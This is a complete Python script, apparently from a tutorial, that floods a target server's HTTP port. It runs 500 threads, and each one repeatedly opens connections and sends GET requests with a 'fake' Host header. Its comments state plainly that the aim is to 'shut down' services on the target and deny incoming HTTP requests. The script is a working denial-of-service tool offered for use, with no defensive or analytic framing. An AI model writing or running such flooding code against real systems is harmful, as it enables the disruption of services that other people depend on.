import socket
import threading

#defining the target ip address and your your fake ip adddress
#NB the port you use will be with respect to the type of services that you want to shut down on the target server
#i use port 80 to deny all http request comming in
target = '10.0.0.138'
fake_ip = '182.21.20.32'
port = 80


#attack_num = 0
def attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
        #  global attack_num
        ##attack_num += 1
        #print(attack_num)
        s.close()

"""Now the last thing that we need to do is to run multiple threads that execute this function at the same time. 
If we would just run the function, it would send a lot of requests over and over
 again but it would always be only one after the other. By using multi-threading, we can send many requests at once.
 """

for i in range(500):
    thread = threading.Thread(target=attack)
    thread.start()